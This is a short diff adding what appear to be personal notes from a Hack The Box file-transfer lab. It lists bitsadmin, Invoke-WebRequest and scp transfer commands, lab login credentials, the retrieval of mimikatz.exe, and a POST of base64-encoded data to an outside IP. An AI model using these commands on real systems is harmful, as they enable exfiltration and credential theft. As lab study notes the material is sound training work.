@@ -1,0 +1,21 @@
+bitsadmin /transfer n "https://raw.githubusercontent.com/seankin/htb/blob/main/File Transfers/upload_win.zip" C:\Users
+
+
+Invoke-WebRequest "https://raw.githubusercontent.com/seankin/htb/blob/main/File Transfers/upload_win.zip" -OutFile upload_win.zip
+
+
+ "htb-student" and password "HTB_@cademy_stdnt!" 
+
+ 10.129.42.198
+
+ scp C:\Temp\upload_win.zip user@10.129.42.198:upload_win.zip
+
+scp htb_student@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
+
+Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
+
+ https://github.com/seankin/htb/blob/main/File%20Transfers/upload_win.zip
+
+ hasher upload_win.txt
+
+ 
